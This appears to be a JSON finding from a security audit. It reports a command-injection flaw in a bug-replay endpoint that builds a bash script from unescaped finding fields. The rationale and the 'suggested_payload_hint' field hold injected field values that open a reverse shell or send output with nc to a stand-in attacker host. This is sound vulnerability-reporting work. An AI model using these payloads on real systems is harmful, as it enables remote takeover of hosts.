  "line": 1723,
  "cap": "OS_COMMAND",
  "endpoint": "POST /api/v1/findings/:id/replay",
  "rationale": "replay_repro_bundle extracts the per-finding USTAR bundle into a tempdir and unconditionally runs `bash <id>/repro.sh`. The script body is built by render_repro_script (repro_bundle.rs:229) which interpolates finding.id, finding.rule, payload.cap, payload.lang directly into the shell source with no escaping — the format string places them inside `# cap={cap} lang={lang} rule={rule}` comments and inside `echo \"[repro] finding={id} cap={cap}\"`. A newline in `rule` or `cap` breaks out of the comment / quoted echo and runs arbitrary shell. Those fields ride in from CandidateFindingRecord populated by the AI Exploration / NovelFinding passes (the very surfaces this Phase-23 worker writes to), so an attacker who can land a single quarantined candidate with `cap = \"X\\nbash -i >& /dev/tcp/attacker/4444 0>&1\\n#\"` and convince the operator to click \"Replay\" gets shell on the daemon host. The replay handler runs bash directly, no sandbox lane, so the static escape suite gate does not apply. The sha256 verification at router.rs:1740 confirms bytes match the row but does nothing about content that was malicious *at write time*, and is also skipped on the build-on-demand branch (router.rs:1719) when no bundles row exists. Static pass missed because the taint path crosses sqlite (candidate row -> finding row -> bundle render -> exec).",
  "suggested_payload_hint": "candidate_findings row: cap = \"AUTH_BYPASS\\nbash -c 'id|nc attacker 4444'\\n#\"; promote -> POST /findings/<id>/replay; watch attacker tcp:4444 land a callback."
